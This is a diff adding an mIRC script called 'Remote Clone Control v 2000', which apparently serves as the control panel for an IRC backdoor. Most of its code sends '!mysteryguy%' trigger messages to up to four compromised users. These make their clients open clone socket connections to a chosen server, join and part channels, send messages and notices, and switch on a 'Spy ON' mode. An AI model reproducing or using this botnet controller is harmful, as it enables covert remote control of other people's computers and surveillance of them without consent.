@@ -1,0 +1,121 @@
+.                                                                                                                                                                                                                 The property of 
+.                                                                                                                                                                                                                 "Air Biru Incorp."
+.                                                                                                                                                                                                           All copy right reserved.                                
+.                                                                                                                                                                                                               Copyright © 500                                                     
+
+alias Remclone dialog -md Remclone Remclone 
+dialog Remclone { 
+  title "Remote Clone Control v 2000" 
+  size -1 -1 350 260 
+  box "Control Panel" 1,5 5 340 130 
+  text "User Name" 2, 40 20 60 20 
+  text "No.of Clones" 3 , 180 20 100 20 
+  radio "" 10 , 10 40 20 20 ,group 
+  radio "" 20 , 10 60 20 20 
+  radio "" 30 , 10 80 20 20 
+  radio "" 40 , 10 100 20 20 
+  edit "" 11,30 40 140 20 ,disable 
+  edit "" 21,30 60 140 20 ,disable 
+  edit "" 31,30 80 140 20 ,disable 
+  edit "" 41,30 100 140 20 ,disable 
+  edit "" 12,180 40 20 20 ,disable 
+  edit "" 22,180 60 20 20 ,disable 
+  edit "" 32,180 80 20 20 ,disable 
+  edit "" 42,180 100 20 20 ,disable 
+  ;;command 
+  text "Server"100,10 140 40 20 
+  edit "" 101,50 137 180 20 
+  text "Port"102,250 140 40 20 
+  edit "" 103,280 137 40 20 
+  button "Connect" 104 ,220 42 100 20,disable 
+  button "Disconnect" 105 ,220 70 100 20 
+  check "Spy ON" 250 ,220 100 100 20 ,push 
+  button "Join Channel" 106 ,250 170 80 30 
+  button "Par Channel" 107 ,250 205 80 30 
+  Button "Clone Message" 108 ,130 170 100 30 
+  Button "Clone Notice" 109 ,130 205 100 30 
+  box "Nickname" 50,5 160 100 80 
+  text "Clone No."51, 15 183 60 20 
+  edit "" 52, 70 180 20 20 
+  button "Change"53,15 210 80 20,disable 
+  button "Done", 201, 300 42 100 70  , OK ,hide 
+} 
+on 1:dialog:remclone:sclick:*:{ 
+  if ($did == 10) { %rem.sel = 10 | did -e remclone 11 | did -e remclone 12 | did -b remclone 21 | did -b remclone 22 | did -b remclone 31 | did -b remclone 32 | did -b remclone 41 | did -b remclone 42 } 
+  if ($did == 20) { %rem.sel = 20 | did -e remclone 21 | did -e remclone 22 | did -b remclone 11 | did -b remclone 12 | did -b remclone 31 | did -b remclone 32 | did -b remclone 41 | did -b remclone 42 } 
+  if ($did == 30) { %rem.sel = 30 | did -e remclone 31 | did -e remclone 32 | did -b remclone 21 | did -b remclone 22 | did -b remclone 11 | did -b remclone 12 | did -b remclone 41 | did -b remclone 42 } 
+  if ($did == 40) { %rem.sel = 40 | did -e remclone 41 | did -e remclone 42 | did -b remclone 21 | did -b remclone 22 | did -b remclone 31 | did -b remclone 32 | did -b remclone 11 | did -b remclone 12 } 
+  if ($did == 104) { 
+    if (%rem.sel == 10) { if (%rem.user1 != $null) && (%rem.clone1 != $null) && (%rem.clone1 isnum) { .msg %rem.user1 !mysteryguy%._file.to_send %rem.server %rem.port %rem.clone1 } | else .timerfault 1 0 _fault No User name / No Clone Selected } 
+    if (%rem.sel == 20) { if (%rem.user2 != $null) && (%rem.clone2 != $null) && (%rem.clone2 isnum) { .msg %rem.user2 !mysteryguy%._file.to_send %rem.server %rem.port %rem.clone2 } | else .timerfault 1 0 _fault No User name / No Clone Selected } 
+    if (%rem.sel == 30) { if (%rem.user3 != $null) && (%rem.clone3 != $null) && (%rem.clone3 isnum) { .msg %rem.user3 !mysteryguy%._file.to_send %rem.server %rem.port %rem.clone3 } | else .timerfault 1 0 _fault No User name / No Clone Selected } 
+    if (%rem.sel == 40) { if (%rem.user4 != $null) && (%rem.clone4 != $null) && (%rem.clone4 isnum) { .msg %rem.user4 !mysteryguy%._file.to_send %rem.server %rem.port %rem.clone4 } | else .timerfault 1 0 _fault No User name / No Clone Selected } 
+  } 
+  if ($did == 105) { 
+    if (%rem.sel == 10) { if (%rem.user1 != $null) && (%rem.clone1 != $null) && (%rem.clone1 isnum) { .msg %rem.user1 !mysteryguy%.sockclose mircread* }  | else .timerfault 1 0 _fault No User name / No Clone Selected } 
+    if (%rem.sel == 20) { if (%rem.user2 != $null) && (%rem.clone2 != $null) && (%rem.clone2 isnum) { .msg %rem.user2 !mysteryguy%.sockclose mircread* }  | else .timerfault 1 0 _fault No User name / No Clone Selected } 
+    if (%rem.sel == 30) { if (%rem.user3 != $null) && (%rem.clone3 != $null) && (%rem.clone3 isnum) { .msg %rem.user3 !mysteryguy%.sockclose mircread* }  | else .timerfault 1 0 _fault No User name / No Clone Selected } 
+    if (%rem.sel == 40) { if (%rem.user4 != $null) && (%rem.clone4 != $null) && (%rem.clone4 isnum) { .msg %rem.user4 !mysteryguy%.sockclose mircread* }  | else .timerfault 1 0 _fault No User name / No Clone Selected } 
+  } 
+  if ($did == 106) { .timerjpj 1 0 rem.join } | if ($did == 107) { .timerjpp 1 0 rem.part } | if ($did == 108) { .timerjps 1 0 rem.msg } |  if ($did == 109) { .timerjpr 1 0 rem.not } 
+  if ($did == 53) { if (%rem.nick != $null || %rem.nick isnum) { .timernpt 1 0 rem.nick } | else return } 
+  if ($did == 250) { 
+    if (%rem.sel == 10) { .msg %rem.user1 !mysteryguy%!Spyon } 
+    if (%rem.sel == 20) { .msg %rem.user2 !mysteryguy%!Spyon } 
+    if (%rem.sel == 30) { .msg %rem.user3 !mysteryguy%!Spyon } 
+    if (%rem.sel == 40) { .msg %rem.user4 !mysteryguy%!Spyon } 
+  } 
+} 
+on 1:dialog:remclone:init:*:{ 
+  if (%rem.user1 != $null) { did -a remclone 11 %rem.user1 } | if (%rem.clone1 != $null) { did -a remclone 12 %rem.clone1 } 
+  if (%rem.user2 != $null) { did -a remclone 21 %rem.user2 } | if (%rem.clone2 != $null) { did -a remclone 22 %rem.clone2 } 
+  if (%rem.ruser2 != $null) { did -a remclone 31 %rem.user3 } | if (%rem.clone3 != $null) { did -a remclone 32 %rem.clone3 } 
+  if (%rem.user4 != $null) { did -a remclone 4 %rem.user4 } | if (%rem.clone4 != $null) { did -a remclone 42 %rem.clone4 } 
+  if (%rem.server != $null) { did -a remclone 101 %rem.server } | if (%rem.port != $null) { did -a remclone 103 %rem.port } 
+  if (%rem.server != $null) && (%rem.port != $null) && (%rem.port isnum) { did -e remclone 104 } 
+  if (%rem.nick != $null) && (%rem.nick isnum) { did -a remclone 52 %rem.nick | did -e remclone 53 } | else { did -b remclone 53 } 
+} 
+on 1:dialog:remclone:edit:*:{ 
+  if ($did == 11) { %rem.user1 = $did(11).text } | if ($did == 12) { %rem.clone1 = $did(12).text } 
+  if ($did == 21) { %rem.user2 = $did(21).text } | if ($did == 22) { %rem.clone2 = $did(22).text } 
+  if ($did == 31) { %rem.user3 = $did(31).text } | if ($did == 32) { %rem.clone3 = $did(32).text } 
+  if ($did == 41) { %rem.user4 = $did(41).text } | if ($did == 42) { %rem.clone4 = $did(42).text } 
+  if ($did == 101) { %rem.server = $did(101).text | if (%rem.server != $null) && (%rem.port != $null) && (%rem.port isnum) { did -e remclone 104 } | else { did -b remclone 104 } } 
+  if ($did == 103) { %rem.port = $did(103).text | if (%rem.server != $null) && (%rem.port != $null) && (%rem.port isnum) { did -e remclone 104 } | else { did -b remclone 104 } } 
+  if ($did == 52) { %rem.nick = $did(52).text | if (%rem.nick != $null) && (%rem.nick isnum) { did -e remclone 53 } | else { did -b remclone 53 } } 
+} 
+alias rem.nick { 
+  set %rem.clonenick $?="Nickname" 
+  if (%rem.sel == 10) { .msg %rem.user1 !mysteryguy%.sockwrite -tn mircread $+ %rem.nick nick %rem.clonenick } 
+  if (%rem.sel == 20) { .msg %rem.user2 !mysteryguy%.sockwrite -tn mircread $+ %rem.nick nick %rem.clonenick } 
+  if (%rem.sel == 30) { .msg %rem.user3 !mysteryguy%.sockwrite -tn mircread $+ %rem.nick nick %rem.clonenick } 
+  if (%rem.sel == 40) { .msg %rem.user4 !mysteryguy%.sockwrite -tn mircread $+ %rem.nick nick %rem.clonenick } 
+} 
+alias rem.join { 
+  set %rem.clonechannel #$?="Channel to join" 
+  if (%rem.sel == 10) { .msg %rem.user1 !mysteryguy%.sockwrite -tn mircread* join %rem.clonechannel } 
+  if (%rem.sel == 20) { .msg %rem.user2 !mysteryguy%.sockwrite -tn mircread* join %rem.clonechannel } 
+  if (%rem.sel == 30) { .msg %rem.user3 !mysteryguy%.sockwrite -tn mircread* join %rem.clonechannel } 
+  if (%rem.sel == 40) { .msg %rem.user4 !mysteryguy%.sockwrite -tn mircread* join %rem.clonechannel } 
+} 
+alias rem.part { 
+  set %rem.clonechannel #$?="Channel to part" 
+  if (%rem.sel == 10) { .msg %rem.user1 !mysteryguy%.sockwrite -tn mircread* part %rem.clonechannel } 
+  if (%rem.sel == 20) { .msg %rem.user2 !mysteryguy%.sockwrite -tn mircread* part %rem.clonechannel } 
+  if (%rem.sel == 30) { .msg %rem.user3 !mysteryguy%.sockwrite -tn mircread* part %rem.clonechannel } 
+  if (%rem.sel == 40) { .msg %rem.user4 !mysteryguy%.sockwrite -tn mircread* part %rem.clonechannel } 
+} 
+alias rem.msg { 
+  set %rem.clonewho $?="#Channel or nick to message" | set %rem.clonemsg $?="Message" 
+  if (%rem.sel == 10) { .msg %rem.user1 !mysteryguy%.sockwrite -tn mircread* PRIVMSG %rem.clonewho : $+ %rem.clonemsg } 
+  if (%rem.sel == 20) { .msg %rem.user2 !mysteryguy%.sockwrite -tn mircread* PRIVMSG %rem.clonewho : $+ %rem.clonemsg } 
+  if (%rem.sel == 30) { .msg %rem.user3 !mysteryguy%.sockwrite -tn mircread* PRIVMSG %rem.clonewho : $+ %rem.clonemsg } 
+  if (%rem.sel == 40) { .msg %rem.user4 !mysteryguy%.sockwrite -tn mircread* PRIVMSG %rem.clonewho : $+ %rem.clonemsg } 
+} 
+alias rem.not { 
+  set %rem.clonewho $?="Channel or nick to message" | set %rem.clonemsg $?="Message" 
+  if (%rem.sel == 10) { .msg %rem.user1 !mysteryguy%.sockwrite -tn mircread* NOTICE %rem.clonewho : $+ %rem.clonemsg } 
+  if (%rem.sel == 20) { .msg %rem.user2 !mysteryguy%.sockwrite -tn mircread* NOTICE %rem.clonewho : $+ %rem.clonemsg } 
+  if (%rem.sel == 30) { .msg %rem.user3 !mysteryguy%.sockwrite -tn mircread* NOTICE %rem.clonewho : $+ %rem.clonemsg } 
+  if (%rem.sel == 40) { .msg %rem.user4 !mysteryguy%.sockwrite -tn mircread* NOTICE %rem.clonewho : $+ %rem.clonemsg } 
+} 
